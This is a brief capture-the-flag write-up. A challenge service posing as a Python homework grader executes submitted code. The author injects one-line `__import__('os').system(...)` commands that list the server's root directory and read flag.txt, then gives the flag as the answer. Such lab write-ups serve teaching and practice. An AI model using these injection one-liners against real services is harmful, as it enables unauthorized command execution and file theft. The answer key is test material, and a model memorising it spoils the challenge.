The prompt when connecting to this website is as follows:

    Welcome to Doctor Professor Wilson's Python 101!
    Lesson 1: hello world
    Enter homework for grading:

We're given free range to execute arbitrary code:

    Enter homework for grading:
    hello world
      File "<string>", line 1
        hello world
                  ^
    SyntaxError: unexpected EOF while parsing

One challenge is that only one line can be submitted before execution is triggered. Fortunately, we can use `__import__` to do work with modules in a one-liner:

    > __import__('os').system('ls')
    bin  boot  dev  entry.sh  etc  flag.txt  hackme.py  home  lib  lib64  media  mnt  opt  proc  requirements.txt  root  run  sbin  srv  sys  tmp  usr  var

It looks as though this command is running in `/`. Look at that, `flag.txt`!

    > __import__('os').system('cat /flag.txt')
    ThisIsAVeryFl@ggyFlag

Answer: ThisIsAVeryFl@ggyFlag
